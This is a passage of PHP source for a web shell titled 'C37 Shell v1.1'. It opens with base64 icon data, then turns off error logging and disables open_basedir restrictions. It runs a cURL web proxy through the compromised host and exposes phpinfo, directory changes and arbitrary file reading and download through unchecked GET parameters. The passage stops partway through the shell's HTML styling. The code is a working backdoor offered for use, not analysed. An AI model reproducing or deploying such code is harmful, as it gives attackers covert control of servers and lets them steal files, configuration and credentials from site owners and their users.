			array('css','css1'),'lhEAAQAMQAAAAAAP///xw2hyA7jCVCkSpJlzBRnTZZpDxhqkFosEZvtUp0uk14vTBvw+zy+vD1/Dd2xz99y0mF0FKO1FyW2WSd3Wuk4e70++3z+rjU8e/1+////wAAAAAAAAAAAAAAACH5BAEAABsALAAAAAAQABAAAAVh4CaOZGmeaEoybOu+25LNdE0vm2LtfM8rm0Sl8ngMi0djYoOgaCjQZxRKQWwOk8tkm+VqJ4eNQYKRmM1ltMSwKUQiDgdcPn8XNgSIfs/fEzYDDYKDhIMDGwKJiouMKo6OIQA7',
			array('rb','rbx','rhtml'),'lhEAAQAOYAAAAAAP///4wMDYsMDfuqSv2eRfLAmPiFOPO5kvS+mvB2Mex4OfNvLutkJvFqL+ZpNOhYIelYIuhWI+NWJelkNOOSdeKUduWWePSfgeSXe+JNH+JRH9tNHuSMcOSNcuKPddRFHt1OJvGJbfKLb9tDG9Q/HNp8Y96Ca8UxE9k8G9xBINJDIs9IKtVmUOJ3Yd15Y9x3Y/CGcPSOd/SOePOQevmUf/eSfviUf+B0YvGKdvOMeM1KOM9ZSdBQQbYUCrETC7UWDbAYEMFEPcppY45cWdealqkTDJsQDKATDawaFKAXE6UaFZwZFct2cooNDJUQDooNDYwODpIQD44PD4oREZcYFZEYFnAsLOXY2Pz6+v39/fHx8fDw8O/v7+7u7u3t7ezs7Ovr6+rq6unp6ejo6Ofn5+bm5uXl5eDg4KGhoZ6enpqampWVlZCQkIqKioSEhH19fXd3d3BwcGpqamNjY15eXlhYWFRUVFBQUP///wAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAHkALAAAAAAQABAAAAfZgHl5aYSFhoKIeWpajI2MamqJeWtaZGVlZmdnWmFra4lsWmNklphaZ2FsbIhtWmJjo5ZaaKhtbYJunGFir2SOWm6Cb1lFQkA+Q1ixZVpvgkQ/PTkvJjtNvLBacIJBODUzGhQZSWG7YlpxeUYuNjIrGwsfS19g5VpyeTw3OiwoHA8WlHj5Qk/LHCQ0YoSIMEGCigtMungZqIXOERggGhxwQCJFhSpcukjUUufJCQUECjCAUMKDlS1cQmqxI6UFghEiMCQw0MGKowB38kyJIsDJACgDqFzBw7RpIAA7',
			array('pdf'),'lhEAAQANU+APj4+Pf39+LHyq18hs50ev7+/qqAiolobbR+h76+vq2Ci7GBivn5+ckABeO4u9aJjbItNYiIiLtMVOjo6IUYI3BBTap1fMsmNuzc3pcADObm5pQOG8HBwfDn6M6Kj8ycouvT1Kk9SPDw8IAADrAdJqVMVs7Ozrp5gbqKkOLN0LcACOCFh8mZmtyqrKJCTeHh4e/v78rKyuTk5PHx8fLy8tQnOKdDTncVH/z8/PX19bQhMJiBhqMeK////////wAAACH5BAEAAD4ALAAAAAAQABAAAAaqQJ+QZysabS4BQMg8TWRQmWZi6il9l5p2q73IEj0rQEcum1/gXgDFa7vfL07kMKfc7vg75SWLJWIWTAcxhDEsDQQwMDM0CEwWMi+SLQ0rM4w5jkIDiooiDSA0NDmZTAOXlw4qD6Q5AQumoqMQDyQSBAQOsJutHhkQtzwZNrs+BgEdIRtKAQAMGDgKTAYMJSMfDDjaOAUF0kIGOBgp291hPd8+FTvs7e47FUEAOw==',
			array('exe','xbe','xex','elf','xpi','pef','nlm','o','app'),'lhEAAQANU1APX19fHx8fj4+Pv7++7u7vPz8/b29uzs7Gd4kfz8/PT09Pr6+vn5+f39/UyQj+jo6EeElenp6UN7mFCXi1iiglKaiVSdhztpoE6UjUmJk+vr6+/v7z1unmCtdmSxcubm5j5xnUF4mkWAll6qeVyofFqlflaghEqMkV2pevDw8ER9l+fn5+3t7UB0m/f39+rq6v7+/tPZ4MrMzf///4+Sl////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADUALAAAAAAQABAAAAaAwJpwSCzWaMikcomMOZ9PREyKQMqu2GwWOet6YbDGgGFQBLgXTksCAYvJlzNtBgqJMo5GFqDacNknGBUJCwICAAUTBFx4ExYUA1kBKAdcgiYlI2QKZhsHL1yPJB0eLlksGg9cMzCEh4gpBBoRK6uthYgBBAcRDx9MwEpGw8TFQkEAOw==',
			array('ini','inf'),'lhEAAQANU/APT09PTy8ry8vK2trfz8+/v7+uru8ri4uLq6uuDh4/Pz9vr6+fz7+76+vvv6+fLy8vj399jY2uXl6JKltZuyx/b19Pz7+rnN4Pr5+Pf29sbV34aGhvn4+J2dnaS90YSdtPTz9Pf19f39/vX08/r5+ZCQkPn49/Px8crKyvf5+rKyssXFxfP08+bl5Zawx7W1tfr6+uDf3/v6+oeesf38/Pj3+Pb19aa+0Imht/7+/f39/MDAwHl5eXKHmsjW4P///yH5BAEAAD8ALAAAAAAQABAAAAatwN9vt1MQjcUdTMjcMRoRHZTQQCFYzF+jkJDournEKiN4MAWLAoOg0+VyiMMBccYsZBa2O9eK0YU9PoGBPoWGB0IGN4o3OD55NHuIPYs9lh4uhIYvPykGPQAVEDg9NQ4FBJEqP5Q9Gho+pJqFqz83PScPFaQgHCSnDAOsExc4xhQzsz7CPxcTlj0fFDYZEBx2HUIig4KG3iVMGycnAQEgIxUh1SYbTDzv8PHwP0EAOw==',
			array('bat','cmd','nt','ncf','com','pif'),'lhEAAQANU/AKW7zP39/Wd2jXGMpMjp/OP//4SatYmkutP9/1h1lPLy89v9//b29vj4+d3k7PDw8Pr6+qjE2MHe8PX19ZufqPr7/Pf4+LrO4T9hgvLx8ev//9Ph6pq4z3ehw/f39/n6+vb19ZCwxx1Xkfr5+fHy8fHy8vPz8+Lq8PLx8mRpgLbr/1iNvKGqu9v1+4qVpfP087HT6LPY7vn5+WF9m/n6+fTz8/j///X29fz8/PT09IOw1ShbkdDW3f///4+Sl////yH5BAEAAD8ALAAAAAAQABAAAAaowJ9wSCz+fMikconkOZ9PAU8qQPauHMfOEZHJLB7GxNrbIXo222XXCE9y1tAZgEkVLgkQKGeynnoUAzIXAy0bN3x9PgE7BRQ4EBkzEjsTNSYoSAEOCwsCMgAHMCwvJgoZmgYwBQQHIRIROgkrJKg+OBU7BhoqrTo7FQkdD0iQMhQxOy4ACRU6wSVIECMWFgwgpb8VIjrEPh9tHm85CiWy3d5M6khG7UNBADs=',
			array('wmv','avi','swf','flv','f4v','3gp','asf','mov','mpg','rm','mp4'),'lhEAAQAOYAAAAAAP///7RUhI5ZdIZhkl5adjtASEdOVztBSEVMVFZeZ3R+iUVvm0ZOVkdOVUhPVm95g3F7hWZveHN9h2JqcmBqc3WAimJrc2Zvd2hxeTyZ6XJ9hkh2mGFrc3iEjXeDjHaCi2lze11mbV9ob12o22NtdGJsc3eDi213fh2q+kJ8njSGskez7U6En2CPp0uy5HXE6HSToIfA1XGgsmB2fmmbqGKXonLU4nLP3v///v7+/f39/Pz8+/v7+vr6+fr5+Pn49/j39vb19PX08/Py8ff19fb09PXz8/Ty8vPx8fLw8P/+/vz7+/j39/f29vb19fTz8/Py8uDf3/7+/v39/fb29srKysTExL+/v76+vry8vLu7u7m5ubi4uLe3t7S0tLKysrCwsKysrKurq5ycnI+Pj4WFhXh4eP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAGgALAAAAAAQABAAAAfPgGhoWISFhVmCiYNMPDs7Ojo8OlZdimhZPYyOkDpXVZWJWj6ZjY86XF5eXIlbPx4eHbEVCighUquCXEAeUzU4ODc2OSE6XoleQR4nMTIyMC4hGcWJX04fOgMCAgQFSxg6X4lgTyAWDw4OCQgSJTtgiWFGFlQrKSkaDFMXPGGJYkcLNrR48YKFChMUmIhJNAbJBCo0ZswgwWHKiB5jEpGJEgHCgY8NDIwQ4YNMojJJiCA5MkRIESdNgPwok8iMkpRIoLR8GdNMojNAgwoNiiYQADs=',
			array('mp3','aac','aif','m3u','midi','mid','mpa','ra','wav','wma'),'lhEAAQAOYAAAAAAP///4mm18rc7k2Y3Nzo8yGD12Kj2Gum2rHP6Ad4zcnd7Ad4ys3i8N/s9QKC1DSa2Vyw5+vz+ACN4RKV3zOTy9Xo8wCM0QOa6RCLzEKk1IvN8Nzq8eLv9gCe6YnE3pDI4p7O5ACe4Tqm0lnE8p7S58Le6gCX0gSj4C2hy/P39/7+/f39/Pz8+/v7+vr6+fn5+P38+/z7+vv6+fr5+Pn49/j39vf29fb19PX08/Py8ff19fb09PXz8/Ty8vPx8fLw8P38/Pz7+/v6+vr5+fn4+Pj39/f29vb19fX09PTz8/Py8ubl5eDf3/b29srKysTExL+/v76+vry8vLu7u7m5ubi4uLe3t7S0tLKysrCwsKysrKurq5ycnI+Pj4WFhXh4eP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAGEALAAAAAAQABAAAAfEgGFhUYSFhVKCiYNCLSwsKystK09WimFSLoyOkCtQTpWJUy+ZjY8rVVdXVYlUNC9DMg4IBZBMTauCVTWuQx0PJJsrV4lXNjUwRBIRKCWmw4JYR8YwFgcfGUGPWIlZSDfGKikzBi0xLFmJWjzeDRsjAwouLS1aiVs9SQQUHhAJAjOZtiTi4qMHBhETGCwo4soFl0RdlviocOKChiNGGL7oksjLDx0mQoDgsAPjLi+JvgD56ENJDhwljdT4kgiMzZs4b4YJBAA7',
			array('c','h'),'lhEAAQAOYAAAAAAP////z8/v7+//n6/t3k9+/y+/X3/fr7/vn6/efs+erv++zw+r3N8MPS8sXT8tLd9dni99ni9tvk+OLp+ebs+ubs+eXr+Onu+e/z/MrY88zZ9M7b9Nrj9tzl99ri8uDo+Ozx++/z+/T3/fv8/tLe9Nbh9tDb79fi9t7n+Nvj8uLq+ebt+ufs9aOxx+Xr9ejt9fX4/ZWjuKSzyZmnvKe2zMHP40JroDRIYjVJY4ulyHmKoJOit5WkuZyrwKu70am5z6SzyJ2swLLC2K+/1a6+1LnI3MjU5LrF1O/0+wE5fSFSjyJTjzJfl0NsoHeVuoGdwYWgwoiiw4ehwoeiwpGqyniKoaCwxLvK3crW5Pj7/vz9/uzx9f7///7+/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAF8ALAAAAAAQABAAAAeigF9fQ4SFRUAzLoKLgwGOj10+ODuMX0SPjgMkPUg4Vow/mAMCCTw5p4w1j1hSUy1JPKaMQY5PTFROTQsWPDiMV15cSlkEL1AqK72MQltGSggHGQwXBcqLNFpHSjAjIR8gKNaCMjEHTFExVUonJeJfPCIGNjdKSzoRG+48GBYVLAoUOnB4oI9CigkSTEDQ4KCBPg+xIkr0tagXjosYM1bayDEQADs=',
			array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),'lhEAAQAPcAAAAAAP////v7/vz8/v7+//39/vn6/vj5/eLo+Ovv+vH0/PT2/NLc9eDn+MbM2+jt+unu+tnd58HQ8cLR8cjV88rX883Z9NDb9dXf9drj97zE1b/H2OPq+erv+u/z/O7y+7zN8MXU8sbV8qOvxqCsw8vY887b9K+5zdHd9NPe9dji97fA0tnj993m+Nzl9+Do+PT3/fP2/Pj6/vf5/fv8/vf4+qWxx6u2y6q1yqizyNXh9rO9z9rk99ji9d7n+NLY49rf6OLm7aOxx7C7zbfB0ubt+e3y+uns8aSzyZ6rvrvF1LjBz/n7/jRIYjVJYztOaDxPaKnD5XmKoLHE3ZOit5alupaluZyrwKm5z7LC2K6+1LjH29rl9Ovw9wBOrg1Ysg5XsiBluS9uvDBvvTJxvjZzvjh1vzh2vz96wWuZ0DtPaEFUbEJVbYit2UlbcpGz3JW23Zm536bC43iKobDH5LPK57TL58ra7t/o8+bu+Ofr8GCSzG6c0X6m1LXM5sTX7MbY7dvn9Nzn8+Dn7+nv9v3+//z9/v7///7+/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAIkALAAAAAAQABAAAAjgABMJTJSloEEtWJAIGThwS4CHEA9daSKFYaJBEB8SoFFFiZM5AvGk6RMHYiEBB5KwUeMk0Z8vYMZ4eRMA0AAmM+4EiQAl0R4vXWq0kUPACw0DB7zEALIm0Rk0AfQg4uKlKtWqU9wkMiMmwJFABQx5mQFjgZcPP5ry8WKHEJkwMup46PAgygsHTxIJKlPVCxwFCTj4yNADBZEmA+n4yaMAAgIeOhhYoDAE8cAlRoo0YIHhQgkRE3BYFmiFQwsVKUxUCCEBhI3Riai42KBhxY4TN3KMIAGbSpPfwIPDtkg8UUAAOw==',
			array('cs','c#=','csproj','csx'),'lhEAAQAOYAAAAAAP////z8/v39/u/y+/r7/vn6/dri9t7l9+Dn+OTq+ebr+Orv++nu+vb4/cHQ8cLR8cfV88rX88zY9NHc9eLp+eXr+ebs+bzN8MXU8s3a887b9NPe9dji99ji9t3m+Nzl99/n9+ju+vT3/dPf9dXh9trk99/o+Oju+e3y++zv9JOhtaSzyZyqvqeyws7U3dXb5OLm7PP1+DRIYjVJY2Byimh5kYKRpYiXrJOit5WkuZyrwKm5z6SzyLLC2LDA1q6+1LrF1O/0+3GDmniKoXmLonyNovT2+PP19/7//+Lt597r4Orz68rfy8/i0K7OrwCZAACVAACUAAGVAQKWAgSXBAaYBgeZBwiZCBmjGXjJeJ7Ynt/s3+Ds4OLu4vv9+////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAGAALAAAAAAQABAAAAezgGCCg4SFhD6IiUA8LD2GPgGRkkk7M0WFP5IBVlwDOkEzRIKRKpFYXFJYAjk0rYJdWVBeXlJVUE0GQjmsYAFQXUdaV1RMUlQODBc5M71QATKRVFNSSwQWJ8u9WV1IW1dRT1NKCyEH2WBdULJfVU4jIggeJOe9MQUwLy43QzY1GvRgcqRooCCBiRIUJkQAmANFixU4jPCrAYFhhQ8dOGyQkOEBBoYgdokcyWzQshkoU6oEEwgAOw==',
			array('asm'),'lhEAAQAOYAAAAAAP////z8/v7+//39/vz8/fr7/uzu88PR8cbU8tXf9rzE1b/H2N7m+OPq+eLp+Obs+evw++Pm7bzN8L7P8aOvxqCsw8rY89Dc9K+5zdXg9rfA0tzl9+Do+O/z+/P2/Ofq8Pf5/fDy9u/x9fv8/vr7/aWxx6u2y6izyLO9z9rk9uHp+PD0+7/I19rf5/X4/aSzybvF1MfQ3c3U3vL2/Pn7/vL09/Hz9jRIYjVJYztOaDxPaGd2i6S72pOit5alupaluZyrwKm5z7LC2K6+1L7H0+3w9DJfl0Z1sUd2sUFUbElbcpOuz5ey1Ki/2qrA26m/2qzB26q7z7C8y6qzvuLp8nuKmunt8e7x9PL09vz9/v3+/v7+/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAF0ALAAAAAAQABAAAAewgF2CQ4SFREIwgoqDXI2OXEE4i4yPjT8xOZNSlY1FVFY8izIBpKVbBTcSO11IR11XUUdHAbKyTUZKXQFMRyNHTwNbRwNHWkciS11JsjZPR04CRwRHJMe5R1VHWQNQRzXF1EcHOsqyWLI9IeEGRyCSijMlBDQsNC8eHxEu74JT9RAPVjhQ0UBBC35dgHRQoQHDhQQIKEwwgdAHBwYLNqTIcAJFBQsVcYgcSRLhpJOCAgEAOw==',
			array('dll','so','lib','sys','drv','cpl','ocx','scr'),'lhEAAQAOYAAAAAAP///wEXNihAXFh0kihbkc/i9fr7/Jqvwq/D1YOw1a/F2KzD1bPV6dbw/9vy/930/9ru9dbo7/f4+P7+/f39/Pz8+/v7+vr6+f38+/r5+Pn49/j39vf29fb19PX08/Py8ff19fb09PXz8/Ty8vPx8fLw8P38/Pz7+/r5+fj39/f29vb19fX09PTz8/Py8ubl5eDf3/b29srKysXFxcDAwL+/v729vby8vLq6urm5ubi4uLW1tbOzs7Gxsa2traysrJ2dnZCQkIaGhnl5ef///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEUALAAAAAAQABAAAAe/gEVFNYSFhTaCiYMoFhUVFBQWFDM6ikU2F4yOkBQ0MpWJNxiZjY8UOTs7OYk4GhgoDAULE5AwMauCORsoBRUPDwUUpjuJOxwMFQ0DDgYLw4k8KwUPAikJEQUnjzyJPSwMvwgSCgQKGRU9iT4iLAUQDwoFBwUKFj6JPyMtHrEEBwoHCKD4kQgICX0eOsSbp+ACkERBXhzcF4KcAldBEgkpAeLgBw8hVqjYoEFIoiEmOJJw8THkyCGJiMicSXNmkUAAOw==',
			array('zip','rar','tar','gz','7z','ace','dmg','par','lzo','tgz','uha','z','zoo','r00','arj','bz','bz2','tbz','tbz2','uu','iso','xxe','cab','pbk','uuf','lzh','lha','deb','pkg','sit','zipx'),'lhEAAQANU/AABrRHkDRf9+0wCDUgBXpogBUgBVnoMCTgBTlZkJYVQTE6APZyoqKlwTGq2usWoPJsvP1YCAAKKjpvz9/3MTKyUlJW4ZH/j7/87P0hA1AAAxT8XFHdHRAJGRAJaWALm5AGm//wVitYzvzf++8FMOIGfqvli2//pnxehZtZjX/6Td/7Dk/7v14U3ns4HL/43R/xXfm/+c4j8/PwBMiHXF/8XHzNnb4ACIV5IBWRhNAAA7ZmITGE8AAP///wAAAP///yH5BAEAAD8ALAAAAAAQABAAAAahQFJjRywWG4qfUqKweDgdC+UxnSaVNVKgw/EEDt9w0nGBKBILtDqdOOwqmEmt0BvFYoL86YRqSHw2PRYbOIWGhQU8PzWADRE8kJGSZBAMPpeYmT4/cHIhPSsqKS8uNCAmJhp/gQQbBK8GsQizm4w2MxE6uru7GpSWmpqccTUDPSwiJSUtLTDOGT8MgQAfN9bX1gOb0TYAETng4eHQSjLBwkEAOw=='
		);
		for ($i = 0; $i<46; $i += 2) {
			if (in_array($_GET['ext'], $ImgArray[$i], TRUE)) {
				echo base64_decode('R0lGOD'.$ImgArray[$i+1]);die;
			}
		}
		echo base64_decode($UnKnown); die;
	}
}

if (function_exists('error_reporting')) { error_reporting(0); }
if (function_exists('set_time_limit')) { set_time_limit(0); }
if (function_exists('ini_set')) { ini_set('error_log',NULL); ini_set('log_errors',0); ini_set('file_uploads',1); ini_set('assert.quiet_eval',0); ini_set('allow_url_fopen',1); ini_set('memory_limit','10000M'); ini_set('upload_max_filesize','100000M'); ini_set('max_execution_time',300); ini_set('magic_quotes_sybase',0); ini_set('magic_quotes_runtime',0); ini_set('magic_quotes_gpc',0); ini_set('open_basedir',NULL); }
elseif (function_exists('ini_alter')) { ini_alter('error_log',NULL); ini_alter('log_errors',0); ini_alter('file_uploads',1); ini_alter('allow_url_fopen',1); ini_alter('memory_limit','100000M'); ini_alter('upload_max_filesize','100000M'); ini_set('max_execution_time',300); ini_alter('magic_quotes_sybase',0); ini_alter('magic_quotes_runtime',0); ini_alter('magic_quotes_gpc',0); ini_alter('open_basedir',NULL); }
if (function_exists('get_magic_quotes_gpc')) {
	if (get_magic_quotes_gpc() === 1) {
		if (isset($_GET)) { for ($i = 0, $Z = count($_GET); $i <= $Z; $i++) { $_GET[$i] = stripslashes($_GET[$i]); } }
		if (isset($_POST)) { for ($i = 0, $Z = count($_POST); $i <= $Z; $i++) { $_POST[$i] = stripslashes($_POST[$i]); } }
	}
}
if (function_exists('get_magic_quotes_runtime')) {
	if (get_magic_quotes_runtime() === 1) {
		if (function_exists('magic_quotes_runtime')) { magic_quotes_runtime(FALSE); }
		if (function_exists('set_magic_quotes_runtime')) { set_magic_quotes_runtime(FALSE); }
	}
}
else {
	if (function_exists('magic_quotes_runtime')) { magic_quotes_runtime(FALSE); }
	if (function_exists('set_magic_quotes_runtime')) { set_magic_quotes_runtime(FALSE); }
}
if (function_exists('ignore_user_abort')) { ignore_user_abort(FALSE); }
if (!isset($_SERVER)) { $_SERVER = $HTTP_SERVER_VARS; }

header('Content-Type: text/html; charset=utf-8');

if ($_GET['action'] === 'cURLframe') {
	session_start();
	if (!empty($_REQUEST['c37url'])) {
		$cURLSess = curl_init();
		if (!empty($_GET['c37url'])) { curl_setopt($cURLSess,CURLOPT_URL,base64_decode($_GET['c37url'])); $CurrentWebsite = $_GET['c37url']; }
		else { curl_setopt($cURLSess,CURLOPT_URL,$_POST['c37url']); $CurrentWebsite = base64_encode($_GET['c37url']); }
		
		curl_setopt($cURLSess,CURLOPT_RETURNTRANSFER,TRUE);
		curl_setopt($cURLSess,CURLOPT_FOLLOWLOCATION,TRUE);
		curl_setopt($cURLSess,CURLOPT_AUTOREFERER,TRUE);
		curl_setopt($cURLSess,CURLOPT_BINARYTRANSFER,TRUE);
		
		if (count($_POST) !== 0) { curl_setopt($cURLSess,CURLOPT_POST,TRUE); curl_setopt($cURLSess,CURLOPT_POSTFIELDS,$_POST); }
		
		if (!isset($_SESSION['UA']) && isset($_POST['UA'])) { $_SESSION['UA'] = $_POST['UA']; }
		curl_setopt($cURLSess, CURLOPT_USERAGENT,$_SESSION['UA']);
		
		$Page = curl_exec($cURLSess);
			
			/*
			$For = 'http'; if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') { $For .= 's'; } $Base = '<base href="'.$For.'://'.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'].htmlspecialchars($_SERVER['PHP_SELF']).'" />';
			$Page = preg_replace('/(<\/head\s*>)/Us',$Base.'${1}',$Page);
			
			$Page = preg_replace('/(<body.*>)/Us','${1}<div style="color:#16387C;background-color:white;text-align:center;"><form method="post">Web Proxy | <a href="?" style="color:#16387C;">Retrun to shell<a> | Go to: <input type="text" size="46" name="c37url" id="c37url" /> <input type="submit" value="Browse" /></form></div>',$Page);
			*/

		header('Content-type: '.curl_getinfo($cURLSess,CURLINFO_CONTENT_TYPE));
		$type = curl_getinfo($cURLSess,CURLINFO_CONTENT_TYPE);
		if (empty($type) || strpos($type,'text/html') !== FALSE || strpos($type,'application/xhtml+xml') !== FALSE || strpos($type,'application/xml') !== FALSE) {
			$For = 'http'; if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') { $For .= 's'; }
			$Href = $For.'://'.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'].$_SERVER['PHP_SELF'].'?action=cURLframe&c37url=';

			$doc = new DOMDocument;
			$doc->loadHTML($Page);

			$items = $doc->getElementsByTagName('a');

			for ($i = 0; $i < $items->length; $i++) {
				$CurItem = $items->item($i);
				if ($CurItem->hasAttribute('href')) {
					$Attribute = $CurItem->getAttribute('href');
					if ($Attribute[0] === '/') { $CurItem->setAttribute('href',$Href.$CurrentWebsite.base64_encode($Attribute)); }
					else { $CurItem->setAttribute('href',$Href.base64_encode($Attribute)); }
				}
			}

			$items = $doc->getElementsByTagName('form');

			for ($i = 0; $i < $items->length; $i++) {
				$CurItem = $items->item($i);
				if ($CurItem->hasAttribute('action')) {
					$Attribute = $CurItem->getAttribute('action');
					if ($Attribute[0] === '/') { $CurItem->setAttribute('action',$Href.$CurrentWebsite.base64_encode($Attribute)); }
					else { $CurItem->setAttribute('action',$Href.base64_encode($Attribute)); }
				}
			}

			$items = $doc->getElementsByTagName('img');

			for ($i = 0; $i < $items->length; $i++) {
				$CurItem = $items->item($i);
				if ($CurItem->hasAttribute('src')) {
					$CurItem->setAttribute('src',$Href.base64_encode($CurItem->getAttribute('src')));
				}
			}

			echo $doc->saveHTML();
		}
		else { echo $Page; }
		curl_close($cURLSess);
		die;
	}
}

$ShowFiles = TRUE;
if (isset($_GET['dir'])) {
	if (!chdir($_GET['dir'])) { $ShowFiles = FALSE; }
}
$CDIR = getcwd();
if ($CDIR[strlen($CDIR)-1] !== DIRECTORY_SEPARATOR) { $CDIR .= DIRECTORY_SEPARATOR; } 
$SCDIR = urlencode($CDIR);

if ($IsAction) {
	if ($_GET['action'] === 'info') { phpinfo(); die; }
	if ($_GET['action'] === 'download') {
		if (is_readable($_GET['file'])) {
			header('Content-Description: File Transfer');
			header('Pragma: public');
			header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); 
			header('Cache-Control: private',false);
			header('Expires: 0');
			$B='Content-Type: ';
			if (class_exists('finfo')) {
				$finfo = new finfo(FILEINFO_MIME);
				$B .= $finfo->file($_GET['file']);
			}
			elseif (function_exists('mime_content_type')) { $B .= mime_content_type($_GET['file']); }
			elseif (function_exists('apache_lookup_uri')) { $Info = apache_lookup_uri($_GET['file']); $B .= $Info->content_type; }
			else { $B .= 'application/download'; }
			header($B);
			header('Content-Disposition: attachment; filename="'.$_GET['file'].'"');
			header('Content-Transfer-Encoding: binary');
			header('Content-Length: '. sprintf('%u', filesize($_GET['file'])));
			if (function_exists('readfile')) { readfile($_GET['file']); }
			elseif (function_exists('file_get_contents')) {
				echo file_get_contents($_GET['file']);
			}
			elseif (function_exists('fread') && function_exists('fopen')) {
				$handle = fopen($_GET['file'], 'rb');
				echo fread($handle,sprintf('%u',filesize($_GET['file'])));
				fclose($handle);
			}
			elseif (function_exists('fgets') && function_exists('fopen')) {
				$handle = fopen($_GET['file'], 'rb');
				$contents = ''; $Line = '';
				do {
					$Line = fgets($handle,sprintf('%u',filesize($_GET['file'])));
					$contents .= $Line;
				} while ($Line !== FALSE);
				echo $contents;
				fclose($handle);
			}
			elseif (function_exists('fgetc') && function_exists('fopen')) {
				$handle = fopen($_GET['file'], 'rb');
				$contents = ''; $Character = '';
				do {
					$Character = fgetc($handle,sprintf('%u',filesize($_GET['file'])));
					$contents .= $Character;
				} while ($Character !== FALSE);
				echo $contents;
				fclose($handle);
			}
			die;
		}
		else { echo 'Are you kidding me?!<br />This file does not exist or is not readable...'; die; }
	}
	if ($_GET['action'] === 'getfile') { if (!readfile($_GET['file'])) { echo file_get_contents($_GET['file']); } die; }
	if ($_GET['action'] === 'printimg') { echo '<html><head></head><body><img src="?action=getfile&amp;file=',$SCDIR,urlencode($_GET['file']),'" /><script type="text/javascript">window.print();</script></body></html>'; die; }
}

$IsWIN = strtoupper(substr(PHP_OS,0,3)) === 'WIN';

echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"',"\r\n\t",'"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">',"\r\n",
'<html lang="en-US" xml:lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="cache-control" content="Private,no-Store" />
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="robots" content="nofollow,noindex,noarchive" />
		<meta http-equiv="Content-Script-Type" content="text/javascript" />
		<meta http-equiv="Content-Style-Type" content="text/css" />
		<title>:: C37 Shell v1.1 - ',$_SERVER['SERVER_NAME'],' ::</title>
		<style type="text/css">
		/*<![CDATA[*/
			body{background-color:black;color:#E5E5E5;font-size:11px;font-family:Tahoma,Verdana,Arial,Helvetica;text-align:center; }
			a {color:#F5F5F5;text-decoration:none; }
			a:hover {text-decoration:underline;color:red; }
			img {border-width:0px;outline:none; }
			input,textarea,button {color:#FFFFFF;background-color:#8B0000;border:1px solid; }
			input[type="checkbox"] {border:0px;background-color:transparent; }
			button,input[type="submit"] {-moz-border-radius-bottomright:4px;-webkit-border-bottom-right-radius:4px; }
			table.RightPad td {padding-right:55px;color:#E5E5E5; }
			table.NoPad td {padding-right:0px;vertical-align:middle;margin-left:-2px; }
			textarea:hover {border-color:gray; }
			fieldset {border:1px solid white; }
			::-moz-selection {background: #ff6161; }
			::selection {background: #ff6161; }
			div,textarea,body{scrollbar-face-color:#8B0000;scrollbar-highlight-color:#FFFFFF;scrollbar-track-color:#000000;scrollbar-arrow-color:#FFFFFF; }
			legend{color:#DB0000; }
			select { color:white; background-color:black; }
		/*]]>*/
		</style>
